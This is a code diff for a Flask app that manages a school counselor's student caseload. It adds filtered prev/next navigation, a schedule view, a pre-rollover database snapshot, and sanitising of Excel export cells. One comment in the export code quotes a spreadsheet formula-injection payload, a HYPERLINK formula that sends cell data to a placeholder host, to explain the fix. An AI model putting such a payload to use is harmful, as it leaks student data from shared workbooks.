@@ -1,5 +1,6 @@
 import io
 import json
+import os
 from datetime import date, datetime, timezone
 from flask import (Blueprint, render_template, request, redirect, url_for,
                    flash, send_file, jsonify, abort)
@@ -7,10 +8,13 @@ from flask_login import login_required, current_user
 from sqlalchemy.exc import IntegrityError
 from app import db, csrf
 from app.models.student import Student, Tag
+from app.models.schedule import ScheduleEntry
 from app.models.rollover import RolloverSnapshot
 from app.models.transcript import TranscriptRecord
 from app.utils.audit import log_action
-from app.utils.helpers import parse_date
+from app.utils.security import xlsx_safe
+from app.utils.db_snapshot import snapshot_database
+from app.utils.helpers import parse_date, current_school_year
 from app.utils.roles import owned_or_404
 
 
@@ -46,22 +50,39 @@ VALID_EL_STATUSES = {'Newcomer', 'LTEL', 'RFEP', 'EO', ''}
 VALID_EL_LEVELS = {'EL 1', 'EL 2', 'EL 3', ''}
 
 
-@caseload_bp.route('/')
-@login_required
-def index():
-    search = request.args.get('search', '').strip()
-    grade = request.args.get('grade', '')
-    status = request.args.get('status', 'active')
-    tag_filter = request.args.get('tag', '')
-    el_filter = request.args.get('el_status', '')
+# Query-string keys that define "which students am I looking at". Carried from
+# the caseload list into the profile so prev/next can walk the same filtered set
+# the counselor is actually working from.
+CASELOAD_FILTER_KEYS = ('search', 'grade', 'status', 'tag', 'el_status')
 
-    # Exclude the per-user Sample Student (screener test vehicle) from the roster.
-    query = Student.query.filter_by(assigned_counselor_id=current_user.id).filter(
+
+def caseload_base_query(user):
+    """Every student on ``user``'s caseload, before any filter.
+
+    Excludes the per-user Sample Student (screener test vehicle) from the roster.
+    """
+    return Student.query.filter_by(assigned_counselor_id=user.id).filter(
         Student.is_sample == False)
+
+
+def apply_caseload_filters(query, args):
+    """Apply the caseload list's filters to ``query``.
+
+    Single source of truth: the list page and the profile's prev/next both go
+    through here, so they can never disagree about which students are "in" the
+    current view. ``args`` is any mapping (request.args or a plain dict).
+    """
+    status = args.get('status', 'active')
+    grade = (args.get('grade') or '').strip()
+    search = (args.get('search') or '').strip()
+    tag_filter = (args.get('tag') or '').strip()
+    el_filter = (args.get('el_status') or '').strip()
 
     if status:
         query = query.filter_by(status=status)
-    if grade:
+    # Guarded cast: a hand-edited or stale ?grade=x used to raise ValueError and
+    # 500 the page. Now an unusable value simply doesn't filter.
+    if grade.isdigit():
         query = query.filter_by(grade_level=int(grade))
     if search:
         query = query.filter(
@@ -75,17 +96,98 @@ def index():
         query = query.filter(Student.tags.any(Tag.name == tag_filter))
     if el_filter:
         query = query.filter_by(el_status=el_filter)
+    return query
+
+
+def caseload_order(query):
+    """The canonical caseload ordering.
+
+    ``Student.id`` is a tiebreaker, not decoration: without it two students
+    sharing a first+last name order arbitrarily, so the list and prev/next could
+    disagree and a "Next" could bounce back to the student you just left.
+    """
+    return query.order_by(Student.last_name, Student.first_name, Student.id)
+
+
+def filtered_caseload_ids(user, args):
+    """Student ids for ``user``, filtered by ``args``, in list order."""
+    query = caseload_order(apply_caseload_filters(caseload_base_query(user), args))
+    return [row[0] for row in query.with_entities(Student.id).all()]
+
+
+def active_filter_args(args):
+    """Just the filter keys actually present, for round-tripping into links."""
+    return {k: v for k in CASELOAD_FILTER_KEYS if (v := (args.get(k) or '').strip())}
+
+
+def _build_student_nav(student_id, args):
+    """Prev/next position for one student within the filtered caseload.
+
+    The ids come only from the current user's own caseload, so navigation can
+    never surface another counselor's student regardless of what filter values
+    are in the URL — and view_student still owned_or_404s on arrival.
+
+    When the student ISN'T in the active filter (a stale link, or a filter that
+    no longer matches them), prev/next fall back to the unfiltered caseload so
+    the counselor is never stranded with two dead buttons. The position counter
+    is suppressed in that case, because "3 of 12" would be a lie about a set the
+    student isn't part of.
+
+    The ends join up: Next from the last student lands on the first, Prev from
+    the first lands on the last, so the caseload walks as a loop.
+    """
+    filters = active_filter_args(args)
+    ordered = filtered_caseload_ids(current_user, args)
+    in_filter = student_id in ordered
+
+    if not in_filter:
+        filters = {}
+        ordered = filtered_caseload_ids(current_user, {})
+
+    try:
+        i = ordered.index(student_id)
+    except ValueError:
+        i = None
+
+    # A lone student must not link to themselves — a button that reloads the
+    # same page reads as broken. Python's negative indexing wraps prev for free.
+    n = len(ordered)
+    wraps = i is not None and n > 1
+
+    return {
+        'filters': filters,
+        'prev_id': ordered[(i - 1) % n] if wraps else None,
+        'next_id': ordered[(i + 1) % n] if wraps else None,
+        'position': (i + 1) if (in_filter and i is not None) else None,
+        'total': len(ordered) if in_filter else None,
+        'filtered': bool(filters),
+    }
+
+
+@caseload_bp.route('/')
+@login_required
+def index():
+    search = request.args.get('search', '').strip()
+    grade = request.args.get('grade', '')
+    status = request.args.get('status', 'active')
+    tag_filter = request.args.get('tag', '')
+    el_filter = request.args.get('el_status', '')
+
+    query = apply_caseload_filters(caseload_base_query(current_user), request.args)
 
     page = request.args.get('page', 1, type=int)
-    pagination = query.order_by(
-        Student.last_name, Student.first_name
-    ).paginate(page=max(1, page), per_page=50, error_out=False)
+    pagination = caseload_order(query).paginate(
+        page=max(1, page), per_page=50, error_out=False)
     tags = Tag.query.order_by(Tag.name).all()
 
     return render_template('caseload/index.html',
         students=pagination.items, pagination=pagination,
         search=search, grade=grade,
-        status=status, tag_filter=tag_filter, el_filter=el_filter, tags=tags)
+        status=status, tag_filter=tag_filter, el_filter=el_filter, tags=tags,
+        # Round-tripped into each student link so opening a profile keeps the
+        # filter, and prev/next walks the same set. `page` is deliberately
+        # dropped — the profile navigates by position, not by page.
+        caseload_filter_args=active_filter_args(request.args))
 
 
 @caseload_bp.route('/add', methods=['GET', 'POST'])
@@ -167,6 +269,8 @@ def view_student(id):
     log_action('view', 'student', student.id)
     notes = student.notes.limit(10).all()
     latest_transcript = student.transcript_records.first()
+
+    student_nav = _build_student_nav(id, request.args)
 
     uses_state_min = student.uses_state_minimum
     total_required = STATE_MIN_TOTAL if uses_state_min else TOTAL_REQUIRED
@@ -265,8 +369,63 @@ def view_student(id):
         prev_by_template[r.template_id] = r
     screenings_with_delta.reverse()             # newest first for display
 
+    # Current-year schedule, grouped by period for display. Non-class rows (a
+    # "Vice Principal" assignment) and advisory are kept but excluded from the
+    # in-progress credit total via ScheduleEntry.counts_for_credit.
+    schedule_year = current_school_year()
+    sched = ScheduleEntry.query.filter_by(
+        student_id=student.id, school_year=schedule_year
+    ).order_by(ScheduleEntry.period, ScheduleEntry.term).all()
+    if not sched:
+        # Fall back to whatever year we do have, so an off-cycle import still shows.
+        latest = ScheduleEntry.query.filter_by(student_id=student.id).order_by(
+            ScheduleEntry.school_year.desc()).first()
+        if latest:
+            schedule_year = latest.school_year
+            sched = ScheduleEntry.query.filter_by(
+                student_id=student.id, school_year=schedule_year
+            ).order_by(ScheduleEntry.period, ScheduleEntry.term).all()
+
+    schedule_by_period = []
+    for entry in sched:
+        if schedule_by_period and schedule_by_period[-1][0] == entry.period:
+            schedule_by_period[-1][1].append(entry)
+        else:
+            schedule_by_period.append((entry.period, [entry]))
+    schedule_credits = sum(e.credits or 0 for e in sched if e.counts_for_credit) or None
+
+    # Schedule health: a full 4x4 year is 8 semester-length classes with no
+    # hole in the period x quarter grid, and every prerequisite met by a course
+    # completed STRICTLY EARLIER on the timeline — which on a block schedule
+    # includes an earlier quarter of the same year.
+    schedule_analysis = None
+    course_outcomes = None
+    if sched:
+        from app.models.course import Course
+        from app.models.grade import GradeRecord
+        from app.utils.schedule_analysis import analyze_student_schedule
+        from app.utils.grade_outcomes import student_course_outcomes
+        numbers = {str(e.course_number).strip() for e in sched if e.course_number}
+        courses_by_number = {
+            c.course_number: c for c in Course.query.filter(
+                Course.course_number.in_(numbers)).all()} if numbers else {}
+        grade_history = GradeRecord.query.filter_by(student_id=student.id).all()
+        schedule_analysis = analyze_student_schedule(
+            sched, grade_history, courses_by_number)
+        # This student's own D/F courses this year — the per-student counterpart
+        # of the caseload-wide "Outcomes by Section" report. Grades are matched
+        # to the SAME year as the schedule so a prior-year D doesn't surface.
+        current_grades = [g for g in grade_history if g.school_year == schedule_year]
+        course_outcomes = student_course_outcomes(sched, current_grades)
+
     return render_template('caseload/view.html',
         student=student, notes=notes,
+        student_nav=student_nav,
+        schedule_by_period=schedule_by_period,
+        schedule_year=schedule_year,
+        schedule_credits=schedule_credits,
+        schedule_analysis=schedule_analysis,
+        course_outcomes=course_outcomes,
         latest_transcript=latest_transcript,
         transcript_credits=transcript_credits,
         transcript_ag=transcript_ag,
@@ -903,7 +1062,11 @@ def export_caseload():
             s.status,
         ]
         for col_idx, val in enumerate(values, 1):
-            cell = ws.cell(row=row_idx, column=col_idx, value=val)
+            # Names/IDs/emails come from uploaded rosters — an untrusted
+            # boundary. openpyxl coerces a leading '=' into a live formula, so
+            # a student named =HYPERLINK("http://x/?d="&A2,"View") becomes a
+            # click-to-exfiltrate cell in the workbook emailed to admin.
+            cell = ws.cell(row=row_idx, column=col_idx, value=xlsx_safe(val))
             cell.border = thin_border
 
     ws.freeze_panes = 'A2'
@@ -1124,6 +1287,15 @@ def rollover_confirm():
                 .filter(Student.id.in_(action_map.keys()),
                         Student.assigned_counselor_id == current_user.id)
                 .all())
+
+    # Pre-flight snapshot: this mutates every selected student in one commit,
+    # and the RolloverSnapshot undo below expires after 24 hours. Rollover runs
+    # in June; the mistake usually surfaces in August. A file copy here turns
+    # that 24-hour window into a permanent one.
+    snap_path = snapshot_database('pre_rollover')
+    if snap_path:
+        log_action('backup', 'database',
+                   details=f'Pre-rollover snapshot: {os.path.basename(snap_path)}')
 
     counts = {}
     snapshot_items = []
